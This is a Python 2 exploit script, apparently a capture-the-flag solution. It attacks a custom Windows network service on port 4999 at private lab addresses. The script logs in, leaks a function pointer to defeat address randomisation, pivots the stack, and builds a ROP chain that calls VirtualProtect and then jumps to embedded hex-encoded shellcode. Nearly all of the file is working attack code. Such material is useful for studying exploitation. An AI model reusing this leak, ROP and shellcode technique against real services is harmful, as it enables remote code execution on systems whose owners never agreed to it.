#!/usr/bin/env python2
# -*- coding: utf-8 -*-
from zio import *
import time

def login():
    MaxCount = 4
    DstSize = 4
    io.write(l32(0x10) + l32(4) + l32(4))
    io.write(l32(0x11) + 'LeoC'.ljust(DstSize,'A') + ':' + 'gAMU'.ljust(MaxCount, 'B'))
    io.read_until('nice play,you have been logged in!\0')


def leak_base():
    io.write(l32(0x20) + l32(264) + 'A'.ljust(264, 'A'))
    read_len = 268
    io.write(l32(0x21) + l32(read_len))
    io.read(read_len - 4)
    a = io.read(4)
    func_ptr = l32(a)
    return func_ptr - 0x1050


def getVP():
    # set file name
    io.write(l32(0x20) + l32(264) + 'test'.ljust(260, 'A') + l32(0x4))
    time.sleep(1)
    # write file
    io.write(l32(0x31) + 'xxxx' + l32(base+0xDA48))
    time.sleep(1)
    # get virtualprotect address
    io.write(l32(0x30) + l32(4) + 'AAAA')
    # raw_input('got virtualprotect address')


def VP():
    # stack pivot
    # 0x0040102c: xchg esp, ebx ; ret  ;
    pivot_gadget = 0x102c + base
    vp = base+0xda3c
    jmp_esp = base+0x103c
    shellcode = '31d2526863616c6389e65256648b72308b760c8b760cad8b308b7e188b5f'+\
                '3c8b5c1f7883c7048b741f1c83ef0401fe8b4c1f2401f90fb72c5142ad81'+\
                '3c0757696e4575f18b741f1c01fe033caeffd7'
    shellcode = shellcode.decode('hex')
    io.write(l32(0x20) + l32(268) + 'A'.ljust(264, 'A') + l32(pivot_gadget))
    time.sleep(1)
    # do rop on input payload: TODO

    pop_edi_esi_ebx_ebp_ret = base+0x1041
    pop_edx_ret = base + 0x101E
    pop_ecx_ret = base + 0x101C
    pop_eax_ret = base + 0x1018
    mov_eax_ret = base + 0x1024    # mov     eax, [eax]
    call_eax_ret = base + 0x1037   # call    eax
    pusha_ret = base + 0x103E      # pusha
    pop1ret = 0x6305 + base

    rop_payload = l32(pop_edi_esi_ebx_ebp_ret) + l32(pop1ret) + l32(0x41414141) +\
           l32(0x400) + l32(call_eax_ret) + l32(pop_edx_ret) + l32(0x40) +\
           l32(pop_ecx_ret) + l32(base+0xE248) + l32(pop_eax_ret) +\
           l32(vp) + l32(mov_eax_ret) + l32(pusha_ret) + l32(jmp_esp) +\
           '\x90'*20 + shellcode
    # raw_input('breakpoint')
    io.write(l32(0x31) + 'JJJJ' + rop_payload)


target = ('10.211.55.57', 4999) # Win7
# target = ('10.211.55.60', 4999) # XP
io = zio(target, timeout=10000, print_read=COLORED(REPR, 'red'),\
                 print_write=COLORED(REPR, 'green'))

login()
base = leak_base()
print '[+] base: %s' % hex(base)
getVP()
VP()
